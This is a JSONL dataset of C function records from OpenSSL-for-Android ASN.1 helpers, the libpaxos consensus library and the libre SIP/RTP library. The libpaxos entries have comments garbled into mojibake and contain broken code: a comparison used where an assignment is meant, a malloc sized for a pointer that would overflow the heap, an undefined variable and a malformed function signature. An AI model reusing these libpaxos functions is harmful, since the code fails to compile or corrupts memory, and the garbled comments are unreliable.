{"docstring": "/* Copy two byte per character BMPStrings */\n", "func_signal": "static int cpy_bmp(unsigned long value, void *arg)", "code": "{\n\tunsigned char **p, *q;\n\tp = arg;\n\tq = *p;\n\t*q++ = (unsigned char) ((value >> 8) & 0xff);\n\t*q = (unsigned char) (value & 0xff);\n\t*p += 2;\n\treturn 1;\n}", "path": "crypto\\asn1\\a_mbstr.c", "repo_name": "aluvalasuman/OpenSSL1.0.1cForAndroid", "stars": 59, "license": "other", "language": "c", "size": 3737}
{"docstring": "/* Copy to a UTF8String */\n", "func_signal": "static int cpy_utf8(unsigned long value, void *arg)", "code": "{\n\tunsigned char **p;\n\tint ret;\n\tp = arg;\n\t/* We already know there is enough room so pass 0xff as the length */\n\tret = UTF8_putc(*p, 0xff, value);\n\t*p += ret;\n\treturn 1;\n}", "path": "crypto\\asn1\\a_mbstr.c", "repo_name": "aluvalasuman/OpenSSL1.0.1cForAndroid", "stars": 59, "license": "other", "language": "c", "size": 3737}
{"docstring": "/* This function traverses a string and passes the value of each character\n * to an optional function along with a void * argument.\n */\n", "func_signal": "static int traverse_string(const unsigned char *p, int len, int inform,\n\t\t int (*rfunc)(unsigned long value, void *in), void *arg)", "code": "{\n\tunsigned long value;\n\tint ret;\n\twhile(len) {\n\t\tif(inform == MBSTRING_ASC) {\n\t\t\tvalue = *p++;\n\t\t\tlen--;\n\t\t} else if(inform == MBSTRING_BMP) {\n\t\t\tvalue = *p++ << 8;\n\t\t\tvalue |= *p++;\n\t\t\tlen -= 2;\n\t\t} else if(inform == MBSTRING_UNIV) {\n\t\t\tvalue = ((unsigned long)*p++) << 24;\n\t\t\tvalue |= ((unsigned long)*p++) << 16;\n\t\t\tvalue |= *p++ << 8;\n\t\t\tvalue |= *p++;\n\t\t\tlen -= 4;\n\t\t} else {\n\t\t\tret = UTF8_getc(p, len, &value);\n\t\t\tif(ret < 0) return -1;\n\t\t\tlen -= ret;\n\t\t\tp += ret;\n\t\t}\n\t\tif(rfunc) {\n\t\t\tret = rfunc(value, arg);\n\t\t\tif(ret <= 0) return ret;\n\t\t}\n\t}\n\treturn 1;\n}", "path": "crypto\\asn1\\a_mbstr.c", "repo_name": "aluvalasuman/OpenSSL1.0.1cForAndroid", "stars": 59, "license": "other", "language": "c", "size": 3737}
{"docstring": "/* Just count number of characters */\n", "func_signal": "static int in_utf8(unsigned long value, void *arg)", "code": "{\n\tint *nchar;\n\tnchar = arg;\n\t(*nchar)++;\n\treturn 1;\n}", "path": "crypto\\asn1\\a_mbstr.c", "repo_name": "aluvalasuman/OpenSSL1.0.1cForAndroid", "stars": 59, "license": "other", "language": "c", "size": 3737}
{"docstring": "/*\u04bbproposer\udb4e\udf32*/\n", "func_signal": "struct evproposer* evproposer_init(int id, const char* config, struct event_base* b)", "code": "{\n\tint port, acceptor_count;\n\tstruct evproposer* p;\n\n\t/*\u0221\u013c*/\n\tstruct evpaxos_config* conf = evpaxos_config_read(config);\n\tif(conf == NULL)\n\t\treturn NULL;\n\n\t/*\u01f7proposer id*/\n\tif (id < 0 || id >= MAX_N_OF_PROPOSERS) {\n\t\tpaxos_log_error(\"Invalid proposer id: %d\", id);\n\t\treturn NULL;\n\t}\n\n\t/*\u0221proposer\u013c\u02ff*/\n\tport = evpaxos_proposer_listen_port(conf, id);\n\t/*\u0221acceptor*/\n\tacceptor_count = evpaxos_acceptor_count(conf);\n\n\tp = (struct evproposer *)malloc(sizeof(struct evproposer));\n\tp->id = id;\n\tp->base = b;\n\n\t/*\u036c\u02b1\u1f7b\u9c38*/\n\tp->preexec_window = paxos_config.proposer_preexec_window;\n\t\n\t/*\u04bb\u03e2*/\n\tp->receiver = tcp_receiver_new(b, port, handle_request, p);\n\t\n\t/*\u04bbacceptor\u0139*/\n\tp->acceptors = peers_new(b);\n\t/*\u00ffacceptor*/\n\tpeers_connect_to_acceptors(p->acceptors, conf, handle_request, p);\n\t\n\t/*\u00f6\u02b1*/\n\tp->tv.tv_sec = paxos_config.proposer_timeout;\n\tp->tv.tv_usec = 0;\n\t/*\u04bblibevent\u02b1\u00bc,\u04bb\u02b1*/\n\tp->timeout_ev = evtimer_new(b, proposer_check_timeouts, p);\n\tevent_add(p->timeout_ev, &p->tv);\n\n\t/*\u04bbproposer \u03e2*/\n\tp->state = proposer_new(p->id, acceptor_count);\n\n\t/*\u033d\u05b4prepare(\u1c38\u04bb\u05f6)*/\n\tproposer_preexecute(p);\n\n\tevpaxos_config_free(conf);\n\n\treturn p;\n}", "path": "evprepare.c", "repo_name": "yuanrongxi/libpaxos", "stars": 33, "license": "mit", "language": "c", "size": 172}
{"docstring": "/*\u04bb\u0368acceptor id\u02be\u02b5\u053fbitmap\u02b5*/\n", "func_signal": "void quorum_init(struct quorum *q, int acceptors)", "code": "{\n\tq->acceptors = acceptors;\n\tq->quorum = paxos_quorum(acceptors);/*acceptors\u04bb + 1*/\n\tq->acceptor_ids = (int*)malloc(sizeof(int) * q->acceptors);\n\n\tquorum_clear(q);\n}", "path": "quorum.c", "repo_name": "yuanrongxi/libpaxos", "stars": 33, "license": "mit", "language": "c", "size": 172}
{"docstring": "/*\u0435acceptor*/\n", "func_signal": "void peers_connect_to_acceptors(struct peers* p, struct evpaxos_config* conf, bufferevent_data_cb cb, void* arg)", "code": "{\n\tint i;\n\tfor(i = 0; i < evpaxos_acceptor_count(conf); i++){\n\t\tstruct sockaddr_in addr = evpaxos_acceptor_address(c, i);\n\t\tpeers_connect(p, &addr, cb, arg);\n\t}\n}", "path": "peers.c", "repo_name": "yuanrongxi/libpaxos", "stars": 33, "license": "mit", "language": "c", "size": 172}
{"docstring": "/*\u9cec\u02b1\u1c38*/\n", "func_signal": "static void proposer_check_timeouts(evutil_socket_t fd, short event, void* arg)", "code": "{\n\tstruct evproposer* p = arg;\n\tstruct timeout_iterator* iter = proposer_timeout_iterator(p->state);\n\n\t/*\u04bb\u05f6\u03b3\u02b1\u1c38*/\n\tprepare_req* pr;\n\twhile((pr == timeout_iterator_prepare(iter)) != NULL){ /*\u0221\u02b1\u1c38(\u04bb\u05f6)*/\n\t\tpaxos_log_info(\"Instance %d timed out.\", pr->iid);\n\t\t/*\u0533\u02b1\u1c38\u00b7*/\n\t\tsend_prepares(p, pr);\n\t\tfree(pr);\n\t}\n\t\n\taccept_req* ar;\n\twhile((ar = timeout_iterator_accept(iter)) != NULL){ /*\u00f3\u02b1\u1c38(\u06b6\u05f6)*/\n\t\tpaxos_log_info(\"Instance %d timed out.\", ar->iid);\n\t\tsend_accepts(p, ar);\n\t\tfree(ar);\n\t}\n\n\t/*\u0377\u0173\u02b1\u0135*/\n\ttimeout_iterator_free(iter);\n\t/*\u04bb\u02b1*/\n\tevent_add(p->timeout_ev, &p->tv);\n}", "path": "evprepare.c", "repo_name": "yuanrongxi/libpaxos", "stars": 33, "license": "mit", "language": "c", "size": 172}
{"docstring": "/*\u04bbacceptor\u0368\u02b6*/\n", "func_signal": "int quorum_add(struct quorum* q, int id)", "code": "{\n\tif(q->acceptor_ids[id] == 0){\n\t\tq->count ++;\n\t\tq->acceptor_ids[id] = 1;\n\n\t\treturn 1;\n\t}\n\n\treturn 0;\n}", "path": "quorum.c", "repo_name": "yuanrongxi/libpaxos", "stars": 33, "license": "mit", "language": "c", "size": 172}
{"docstring": "/*proposeraccept ack\u0134\u04e6*/\n", "func_signal": "static void proposer_handle_accept_ack(struct evproposer* p, accept_ack* ack)", "code": "{\n\tprepare_req pr;\n\tif (proposer_receive_accept_ack(p->state, ack, &pr))/*accept ack\u04e6\u0436\u03f7\u05b5\u01f7\u04aa\u00b7\u04bb\u05f6*/\n\t\tsend_prepares(p, &pr);\n}", "path": "evprepare.c", "repo_name": "yuanrongxi/libpaxos", "stars": 33, "license": "mit", "language": "c", "size": 172}
{"docstring": "/*\u0377evproposer*/\n", "func_signal": "void proposer_free(struct evproposer* p)", "code": "{\n\tif(p != NULL){\n\t\tif(p->state != NULL)\n\t\t\tproposer_free(p->state);\n\n\t\tif(p->acceptors != NULL)\n\t\t\tpeers_free(p->acceptors);\n\n\t\tif(p->receiver != NULL)\n\t\t\ttcp_receiver_free(p->receiver);\n\n\t\tfree(p);\n\t}\n}", "path": "evprepare.c", "repo_name": "yuanrongxi/libpaxos", "stars": 33, "license": "mit", "language": "c", "size": 172}
{"docstring": "/*Received a accept request (phase 2a).*/\n", "func_signal": "static void handle_accept_req(struct evacceptor* a, struct bufferevent* bev, accept_req* ar)", "code": "{\n\tpaxos_log_debug(\"Handling accept for instance %d ballot %d\", ar->iid, ar->ballot);\n\t\n\tint i;\n\n\tstruct carray* bevs = tcp_receiver_get_events(a->receiver);\n\tacceptor_record* rec = acceptor_receive_accept(a->state, ar);\n\tif(ar->ballot == rec->ballot){/*\u047d\u9c38\u0435(proposerlearner)ack,*/\n\t\tfor(i = 0; i < carray_count(bevs); i++)\n\t\t\tsendbuf_add_accept_ack(carray_at(&bevs, i), rec);\n\t}\n\telse{/*\u03aa\u98ecnackpropose\u00b5\u1c38*/\n\t\tsendbuf_add_accept_ack(bev, rec);\n\t}\n\t\n\tacceptor_free_record(a->state, rec);\n}", "path": "evacceptor.c", "repo_name": "yuanrongxi/libpaxos", "stars": 33, "license": "mit", "language": "c", "size": 172}
{"docstring": "/*proposerprepare ack\u0134\u04e6*/\n", "func_signal": "static void proposer_handle_prepare_ack(struct evproposer* p, prepare_ack* ack)", "code": "{\n\tprepare_req pr;\n\tif(proposer_receive_prepare_ack(p->state, ack, &pr)) /*prepare ack\u04e6\u0436\u03f7\u05b5\u01f7\u04aa\u00b7\u04bb\u05f6*/\n\t\tsend_prepares(p, &pr);\n}", "path": "evprepare.c", "repo_name": "yuanrongxi/libpaxos", "stars": 33, "license": "mit", "language": "c", "size": 172}
{"docstring": "/*prepare ack\u03e2*/\n", "func_signal": "int proposer_receive_prepare_ack(struct proposer* p, prepare_ack* ack, prepare_req* out)", "code": "{\n\tkhiter_t k = kh_get_instance(p->prepare_instances, ack->iid);\n\tif(k == kh_end(p->prepare_instances)){/*\u06b5*/\n\t\tpaxos_log_debug(\"Promise dropped, instance %u not pending\", ack->iid);\n\t\treturn 0;\n\t}\n\n\tstruct instance* inst = kh_value(p->prepare_instances, k);\n\tif(ack->ballot < inst->ballot){ /*acceptor \u0735\u1c38\u0171proposer\u1c38\u0421*/\n\t\tpaxos_log_debug(\"Promise dropped, too old\");\n\t\treturn 0;\n\t}\n\n\tif(ack->ballot > inst->ballot){ /*acceptor \u0735\u1c38proposer\u1c38*/\n\t\tpaxos_log_debug(\"Instance %u preempted: ballot %d ack ballot %d\", inst->iid, inst->ballot, ack->ballot);\n\t\tproposer_preempt(p, inst, out); /*\u04bback->ballot\u1c38*/\n\t\treturn 1;\n\t}\n\n\t/*\u0235\u0434\u0373*/\n\tif(!quorum_add(&inst->quorum, ack->accept_id)){\n\t\tpaxos_log_debug(\"Duplicate promise dropped from: %d, iid: %u\", ack->accept_id, inst->iid);\n\t\treturn 0;\n\t}\n\n\tpaxos_log_debug(\"Received valid promise from: %d, iid: %u\", ack->accept_id, inst->iid);\n\n\t/*\u1c38\u0368\u02e3ack->value(acceptor\u0368\u1c38\u0175\u05b5)value*/\n\tif (ack->value_size > 0) {\n\t\tpaxos_log_debug(\"Promise has value\");\n\n\t\tif(inst->value == NULL) {\n\t\t\tinst->value_ballot = ack->value_ballot;\n\t\t\tinst->value = wrap_value(ack->value, ack->value_size);\n\t\t} else if (ack->value_ballot > inst->value_ballot) {\n\t\t\tfree(inst->value);\n\t\t\tinst->value_ballot = ack->value_ballot;\n\t\t\tinst->value = wrap_value(ack->value, ack->value_size);\n\t\t\tpaxos_log_debug(\"Value in promise saved, removed older value\");\n\t\t} else\n\t\t\tpaxos_log_debug(\"Value in promise ignored\");\n\t}\n\n\treturn 0;\n}", "path": "proposer.c", "repo_name": "yuanrongxi/libpaxos", "stars": 33, "license": "mit", "language": "c", "size": 172}
{"docstring": "/*proposer\u03e2\u04ff*/\n", "func_signal": "static void proposer_handle_msg(struct evproposer* p, struct bufferevent* bev)", "code": "{\n\tpaxos_msg msg;\n\tstruct evbuffer* in;\n\tchar* buffer = NULL;\n\n\t/*\u03e2\u0377*/\n\tin = bufferevent_get_input(bev);\n\tevbuffer_remove(in, &msg, sizeof(paxos_msg));\n\n\t/*\u03e2*/\n\tif (msg.data_size > 0) {\n\t\tbuffer = malloc(msg.data_size);\n\t\tevbuffer_remove(in, buffer, msg.data_size);\n\t}\n\n\t/*\u03e2*/\n\tswitch (msg.type){\n\tcase prepare_acks:\n\t\tproposer_handle_prepare_ack(p, (prepare_ack*)buffer);\n\t\tbreak;\n\tcase accept_acks:\n\t\tproposer_handle_accept_ack(p, (accept_ack*)buffer);\n\t\tbreak;\n\tcase submit:\n\t\tproposer_handle_client_msg(p, buffer, msg.data_size);\n\t\tbreak;\n\tdefault:\n\t\tpaxos_log_error(\"Unknow msg type %d not handled\", msg.type);\n\t\treturn;\n\t}\n\n\t/*\u0537\u0135\u06b6\u05f6,\u05f6\u053c*/\n\ttry_accept(p);\n\n\tif (buffer != NULL)\n\t\tfree(buffer);\n}", "path": "evprepare.c", "repo_name": "yuanrongxi/libpaxos", "stars": 33, "license": "mit", "language": "c", "size": 172}
{"docstring": "/*\u0368\u04bb\u02b1accept instance \u04bbaccept req*/\n", "func_signal": "accept_req* timeout_iterator_accept(struct timeout_iterator* iter)", "code": "{\n\tstruct instance* inst;\n\tstruct proposer* p = iter->proposer;\n\tinst = next_timedout(p->accept_instances, &iter->ai, &iter->timeout);\n\tif (inst != NULL) {\n\t\tinst->created_at = iter->timeout;\n\t\treturn instance_to_accept_req(inst);\n\t}\n\treturn NULL;\n}", "path": "proposer.c", "repo_name": "yuanrongxi/libpaxos", "stars": 33, "license": "mit", "language": "c", "size": 172}
{"docstring": "/*\u0368\u04bb\u02b1prepare instance \u04bbprepare_req*/\n", "func_signal": "prepare_req* timeout_iterator_prepare(struct timeout_iterator* iter)", "code": "{\n\tstruct instance* inst;\n\tstruct proposer* p = iter->proposer;\n\tinst = next_timedout(p->prepare_instances, &iter->pi, &iter->timeout); \n\tif(inst != NULL){ /*\u04bbprepare req*/\n\t\tprepare_req* req = malloc(sizeof(prepare_req));\n\t\t*req = (prepare_req){inst->iid, inst->ballot};\n\t\tinst->created_at = iter->timeout;\n\n\t\treturn req;\n\t}\n\treturn NULL;\n}", "path": "proposer.c", "repo_name": "yuanrongxi/libpaxos", "stars": 33, "license": "mit", "language": "c", "size": 172}
{"docstring": "/*repeat reqs*/\n", "func_signal": "static void handle_repeat_req(struct evacceptor* a, struct bufferevent* bev, iid_t iid)", "code": "{\n\tpaxos_log_debug(\"Handling repeat for instance %d\", iid);\n\tacceptor_record* rec = acceptor_receive_repeat(a->state, iid);\n\tif(rec != NULL){\n\t\tsendbuf_add_accept_ack(bev, rec); /*\u0637\u04bbaccept_acks*/\n\t\tacceptor_free_record(a->state, rec);\n\t}\n}", "path": "evacceptor.c", "repo_name": "yuanrongxi/libpaxos", "stars": 33, "license": "mit", "language": "c", "size": 172}
{"docstring": "/*\u04bbpaxos msg\u0377\u03e2\u0375*/\n", "func_signal": "static void add_paxos_header(struct bufferevent* bev, paxos_msg_code c, size_t s)", "code": "{\n\tpaxos_msg m;\n\tm.data_size = s;\n\tm.type = c;\n\tbufferevent_write(bev, &m, sizeof(paxos_msg));\n}", "path": "tcp_sendbuf.c", "repo_name": "yuanrongxi/libpaxos", "stars": 33, "license": "mit", "language": "c", "size": 172}
{"docstring": "/*accept_req\u0435acceptor\u0435\u06b6\u05f6\u03b5*/\n", "func_signal": "static void send_accepts(struct evproposer* p, accept_req* ar)", "code": "{\n\tint i;\n\tfor(i = 0; i < peers_count(p->acceptors); i++){\n\t\tstruct bufferevent* bev = peers_get_buffer(p->acceptors, i);\n\t\tsendbuf_add_accept_req(bev, ar);\n\t}\n}", "path": "evprepare.c", "repo_name": "yuanrongxi/libpaxos", "stars": 33, "license": "mit", "language": "c", "size": 172}
{"docstring": "/*Received a prepare request (phase 1a).*/\n", "func_signal": "static void handle_prepare_req(struct evacceptor* a, struct bufferevent* bev, prepare_req* pr)", "code": "{\n\tpaxos_log_debug(\"Handling prepare for instance %d ballot %d\", pr->iid, pr->ballot);\n\t/*acceptorprepare_reqs*/\n\tacceptor_record* rec = acceptor_receive_prepare(a->state, pr); \n\t/*\u0374*/\n\tsendbuf_add_prepare_ack(bev, rec);\n\t/*\u0377record\u02b1*/\n\tacceptor_free_record(a->state, rec);\n}", "path": "evacceptor.c", "repo_name": "yuanrongxi/libpaxos", "stars": 33, "license": "mit", "language": "c", "size": 172}
{"docstring": "/*\u04bb\u02b1prepare instance*/\n", "func_signal": "static struct instance* next_timedout(khash_t(instance)* h, khiter_t* k, struct timeval* t)", "code": "{\n\tfor(; *k != kh_end(h); ++(*k)){\n\t\tif(!kh_exist(h, *k))\n\t\t\tcontinue;\n\n\t\tstruct instance* inst = kh_value(h, *k);\n\t\tif(quorum_reached(&inst->quorum)) /*\u0368,\u02b1\u0436*/\n\t\t\tcontinue;\n\t\t\n\t\tif(instance_has_timedout(inst, t)) /*\u9ff4\u02b1*/\n\t\t\treturn inst;\n\t}\n\n\treturn NULL;\n}", "path": "proposer.c", "repo_name": "yuanrongxi/libpaxos", "stars": 33, "license": "mit", "language": "c", "size": 172}
{"docstring": "/*\u013c\u03e2\u04bbevlearner*/\n", "func_signal": "static struct evlearner* evlearner_init_conf(struct evpaxos_config* c, deliver_function f, void* arg, struct event_base* b)", "code": "{\n\tstruct evlearner* l;\n\t/*\u0221acceptor\u0138*/\n\tint acceptor_count = evpaxos_acceptor_count(c);\n\n\tl = (struct evlearner*)malloc(sizeof(struct evlearner*));\n\tl->delfun = f;\n\tl->delarg = arg;\n\tl->state = learner_new(acceptor_count);\n\t/*\u04bbacceptor\u04f9*/\n\tl->acceptors = peers_new(b);\n\t/*acceptor*/\n\tpeers_connect_to_acceptors(l->acceptors, c, on_acceptor_msg, l);\n\n\tl->tv.tv_sec = 0;\n\tl->tv.tv_usec = 100000; /*100ms*/\n\t/*\u00fcholes\u0136\u02b1\u00bc*/\n\tl->hole_timer = evtimer_new(b, learner_check_holes, l);\n\t/*\u04bb\u02b1\u00bc*/\n\tevent_add(l->hole_timer, &l->tv);\n\n\treturn l;\n}", "path": "evlearner.c", "repo_name": "yuanrongxi/libpaxos", "stars": 33, "license": "mit", "language": "c", "size": 172}
{"docstring": "/*clientpaxos proposer\u04bb*/\n", "func_signal": "static struct bufferevent* connect_to_proposer((struct event_base* b, struct sockaddr* addr)", "code": "{\n\tstruct bufferevent* bev;\n\n\tbev = bufferevent_socket_new(b, -1, BEV_OPT_CLOSE_ON_FREE);\n\tbufferevent_setcb(bev, NULL, NULL, event_callback, NULL);\n\n\tif (bufferevent_socket_connect(bev, addr, sizeof(struct sockaddr)) < 0){\n\t\tbufferevent_free(bev);\n\t\treturn NULL;\n\t}\n\n\tevent_base_dispatch(b);\n\n\treturn bev;\n}", "path": "client_main.c", "repo_name": "yuanrongxi/libpaxos", "stars": 33, "license": "mit", "language": "c", "size": 172}
{"docstring": "/**\n * Send an RTCP Application-Defined (APP) packet\n *\n * @param rs   RTP Socket\n * @param name Ascii name (4 octets)\n * @param data Application-dependent data\n * @param len  Number of bytes of data\n *\n * @return 0 for success, otherwise errorcode\n */\n", "func_signal": "int rtcp_send_app(struct rtp_sock *rs, const char name[4],\n\t\t  const uint8_t *data, size_t len)", "code": "{\n\treturn rtcp_quick_send(rs, RTCP_APP, 0, rtp_sess_ssrc(rs),\n\t\t\t       name, data, len);\n}", "path": "src\\rtp\\rtcp.c", "repo_name": "muromec/libre", "stars": 38, "license": "None", "language": "c", "size": 472}
{"docstring": "/**\n * Print a formatted string to a buffer\n *\n * @param str  Buffer for output string\n * @param size Size of buffer\n * @param fmt  Formatted string\n *\n * @return The number of characters printed, or -1 if error\n */\n", "func_signal": "int re_snprintf(char *str, size_t size, const char *fmt, ...)", "code": "{\n\tva_list ap;\n\tint n;\n\n\tva_start(ap, fmt);\n\tn = re_vsnprintf(str, size, fmt, ap);\n\tva_end(ap);\n\n\treturn n;\n}", "path": "src\\fmt\\print.c", "repo_name": "muromec/libre", "stars": 38, "license": "None", "language": "c", "size": 472}
{"docstring": "/**\n * Update a SIP authentication state from a SIP message\n *\n * @param auth SIP Authentication state\n * @param msg  SIP Message\n *\n * @return 0 if success, otherwise errorcode\n */\n", "func_signal": "int sip_auth_authenticate(struct sip_auth *auth, const struct sip_msg *msg)", "code": "{\n\tif (!auth || !msg)\n\t\treturn EINVAL;\n\n\tif (sip_msg_hdr_apply(msg, true, SIP_HDR_WWW_AUTHENTICATE,\n\t\t\t      auth_handler, auth))\n\t\treturn auth->err;\n\n\tif (sip_msg_hdr_apply(msg, true, SIP_HDR_PROXY_AUTHENTICATE,\n\t\t\t      auth_handler, auth))\n\t\treturn auth->err;\n\n\treturn 0;\n}", "path": "src\\sip\\auth.c", "repo_name": "muromec/libre", "stars": 38, "license": "None", "language": "c", "size": 472}
{"docstring": "/**\n * Print a formatted string to a file stream, using va_list\n *\n * @param stream File stream for the output\n * @param fmt    Formatted string\n * @param ap     Variable-arguments list\n *\n * @return The number of characters printed, or -1 if error\n */\n", "func_signal": "int re_vfprintf(FILE *stream, const char *fmt, va_list ap)", "code": "{\n\tchar buf[4096]; /* TODO: avoid static, use print_handler_dyn ? */\n\tstruct pl pl;\n\tsize_t n;\n\n\tif (!stream)\n\t\treturn -1;\n\n\tpl.p = buf;\n\tpl.l = sizeof(buf);\n\n\tif (0 != re_vhprintf(fmt, ap, print_handler, &pl))\n\t\treturn -1;\n\n\tn = sizeof(buf) - pl.l;\n\n\tif (1 != fwrite(buf, n, 1, stream))\n\t\treturn -1;\n\n\treturn (int)n;\n}", "path": "src\\fmt\\print.c", "repo_name": "muromec/libre", "stars": 38, "license": "None", "language": "c", "size": 472}
{"docstring": "/**\n * Print a formatted string to a buffer\n *\n * @param strp Buffer pointer for output string\n * @param fmt  Formatted string\n *\n * @return 0 if success, otherwise errorcode\n */\n", "func_signal": "int re_sdprintf(char **strp, const char *fmt, ...)", "code": "{\n\tva_list ap;\n\tint err;\n\n\tva_start(ap, fmt);\n\terr = re_vsdprintf(strp, fmt, ap);\n\tva_end(ap);\n\n\treturn err;\n}", "path": "src\\fmt\\print.c", "repo_name": "muromec/libre", "stars": 38, "license": "None", "language": "c", "size": 472}
{"docstring": "/**\n * Get the default source IP address\n *\n * @param af  Address Family\n * @param ip  Returned IP address\n *\n * @return 0 if success, otherwise errorcode\n */\n", "func_signal": "int net_default_source_addr_get(int af, struct sa *ip)", "code": "{\n#if defined(WIN32) || defined(CYGWIN)\n\treturn net_hostaddr(af, ip);\n#else\n\tchar ifname[64] = \"\";\n\n#ifdef HAVE_ROUTE_LIST\n\t/* Get interface with default route */\n\t(void)net_rt_default_get(af, ifname, sizeof(ifname));\n#endif\n\n\t/* First try with default interface */\n\tif (0 == net_if_getaddr(ifname, af, ip))\n\t\treturn 0;\n\n\t/* Then try first real IP */\n\tif (0 == net_if_getaddr(NULL, af, ip))\n\t\treturn 0;\n\n\treturn net_if_getaddr4(ifname, af, ip);\n#endif\n}", "path": "src\\net\\net.c", "repo_name": "muromec/libre", "stars": 38, "license": "None", "language": "c", "size": 472}
{"docstring": "/**\n * Print an RTCP Message\n *\n * @param pf  Print handler for debug output\n * @param msg RTCP Message\n *\n * @return 0 if success, otherwise errorcode\n */\n", "func_signal": "int rtcp_msg_print(struct re_printf *pf, const struct rtcp_msg *msg)", "code": "{\n\tsize_t i, j;\n\tint err;\n\n\tif (!msg)\n\t\treturn 0;\n\n\terr = re_hprintf(pf, \"%8s pad=%d count=%-2d pt=%-3d len=%u \",\n\t\t\t rtcp_type_name((enum rtcp_type)msg->hdr.pt),\n\t\t\t msg->hdr.p,\n\t\t\t msg->hdr.count, msg->hdr.pt, msg->hdr.length);\n\tif (err)\n\t\treturn err;\n\n\tswitch (msg->hdr.pt) {\n\n\tcase RTCP_SR:\n\t\terr = re_hprintf(pf, \"%08x %u %u %u %u %u\",\n\t\t\t\t msg->r.sr.ssrc,\n\t\t\t\t msg->r.sr.ntp_sec,\n\t\t\t\t msg->r.sr.ntp_frac,\n\t\t\t\t msg->r.sr.rtp_ts,\n\t\t\t\t msg->r.sr.psent,\n\t\t\t\t msg->r.sr.osent);\n\t\tfor (i=0; i<msg->hdr.count && !err; i++) {\n\t\t\tconst struct rtcp_rr *rr = &msg->r.sr.rrv[i];\n\t\t\terr = re_hprintf(pf, \" {%08x %u %d %u %u %u %u}\",\n\t\t\t\t\t rr->ssrc, rr->fraction, rr->lost,\n\t\t\t\t\t rr->last_seq, rr->jitter,\n\t\t\t\t\t rr->lsr, rr->dlsr);\n\t\t}\n\t\tbreak;\n\n\tcase RTCP_RR:\n\t\terr = re_hprintf(pf, \"%08x\", msg->r.rr.ssrc);\n\t\tfor (i=0; i<msg->hdr.count && !err; i++) {\n\t\t\tconst struct rtcp_rr *rr = &msg->r.rr.rrv[i];\n\t\t\terr = re_hprintf(pf, \" {0x%08x %u %d %u %u %u %u}\",\n\t\t\t\t\t rr->ssrc, rr->fraction, rr->lost,\n\t\t\t\t\t rr->last_seq, rr->jitter,\n\t\t\t\t\t rr->lsr, rr->dlsr);\n\t\t}\n\t\tbreak;\n\n\tcase RTCP_SDES:\n\t\tfor (i=0; i<msg->hdr.count; i++) {\n\t\t\tconst struct rtcp_sdes *sdes = &msg->r.sdesv[i];\n\n\t\t\terr = re_hprintf(pf, \" {0x%08x n=%u\",\n\t\t\t\t\t sdes->src, sdes->n);\n\t\t\tfor (j=0; j<sdes->n && !err; j++) {\n\t\t\t\tconst struct rtcp_sdes_item *item;\n\t\t\t\titem = &sdes->itemv[j];\n\t\t\t\terr = re_hprintf(pf, \" <%s:%b>\",\n\t\t\t\t\t\t rtcp_sdes_name(item->type),\n\t\t\t\t\t\t item->data, item->length);\n\t\t\t}\n\t\t\terr |= re_hprintf(pf, \"}\");\n\t\t}\n\t\tbreak;\n\n\tcase RTCP_BYE:\n\t\terr = re_hprintf(pf, \"%u srcs:\", msg->hdr.count);\n\t\tfor (i=0; i<msg->hdr.count && !err; i++) {\n\t\t\terr = re_hprintf(pf, \" %08x\",\n\t\t\t\t\t msg->r.bye.srcv[i]);\n\t\t}\n\t\terr |= re_hprintf(pf, \" '%s'\", msg->r.bye.reason);\n\t\tbreak;\n\n\tcase RTCP_APP:\n\t\terr = re_hprintf(pf, \"src=%08x '%b' data=%zu\",\n\t\t\t\t msg->r.app.src,\n\t\t\t\t msg->r.app.name, sizeof(msg->r.app.name),\n\t\t\t\t msg->r.app.data_len);\n\t\tbreak;\n\n\tcase RTCP_FIR:\n\t\terr = re_hprintf(pf, \"ssrc=%08x\", msg->r.fir.ssrc);\n\t\tbreak;\n\n\tcase RTCP_NACK:\n\t\terr = re_hprintf(pf, \"ssrc=%08x fsn=%04x blp=%04x\",\n\t\t\t\t msg->r.nack.ssrc, msg->r.nack.fsn,\n\t\t\t\t msg->r.nack.blp);\n\t\tbreak;\n\n\tcase RTCP_RTPFB:\n\t\terr = re_hprintf(pf, \"pkt=%08x med=%08x n=%u\",\n\t\t\t\t msg->r.fb.ssrc_packet,\n\t\t\t\t msg->r.fb.ssrc_media,\n\t\t\t\t msg->r.fb.n);\n\t\tif (msg->hdr.count == RTCP_RTPFB_GNACK) {\n\t\t\terr |= re_hprintf(pf, \" GNACK\");\n\t\t\tfor (i=0; i<msg->r.fb.n; i++) {\n\t\t\t\terr |= re_hprintf(pf, \" {%04x %04x}\",\n\t\t\t\t\t\t  msg->r.fb.fci.gnackv[i].pid,\n\t\t\t\t\t\t  msg->r.fb.fci.gnackv[i].blp);\n\t\t\t}\n\t\t}\n\t\tbreak;\n\n\tcase RTCP_PSFB:\n\t\terr = re_hprintf(pf, \"pkt=%08x med=%08x n=%u\",\n\t\t\t\t msg->r.fb.ssrc_packet,\n\t\t\t\t msg->r.fb.ssrc_media,\n\t\t\t\t msg->r.fb.n);\n\t\tif (msg->hdr.count == RTCP_PSFB_SLI) {\n\t\t\terr |= re_hprintf(pf, \" SLI\");\n\t\t\tfor (i=0; i<msg->r.fb.n; i++) {\n\t\t\t\terr |= re_hprintf(pf, \" {%04x %04x %02x}\",\n\t\t\t\t\t\t  msg->r.fb.fci.sliv[i].first,\n\t\t\t\t\t\t  msg->r.fb.fci.sliv[i].number,\n\t\t\t\t\t\t  msg->r.fb.fci.sliv[i].picid);\n\t\t\t}\n\t\t}\n\t\tbreak;\n\n\tdefault:\n\t\terr = re_hprintf(pf, \"<len=%u>\", msg->hdr.length);\n\t\tbreak;\n\t}\n\n\terr |= re_hprintf(pf, \"\\n\");\n\n\treturn err;\n}", "path": "src\\rtp\\rtcp.c", "repo_name": "muromec/libre", "stars": 38, "license": "None", "language": "c", "size": 472}
{"docstring": "/**\n * Gather Server Reflexive candidates using STUN Server\n *\n * @param icem      ICE Media object\n * @param stun_srv  STUN Server network address\n *\n * @return 0 if success, otherwise errorcode\n */\n", "func_signal": "int icem_gather_srflx(struct icem *icem, const struct sa *stun_srv)", "code": "{\n\tif (!icem || !stun_srv)\n\t\treturn EINVAL;\n\n\treturn start_gathering(icem, stun_srv, NULL, NULL);\n}", "path": "src\\ice\\gather.c", "repo_name": "muromec/libre", "stars": 38, "license": "None", "language": "c", "size": 472}
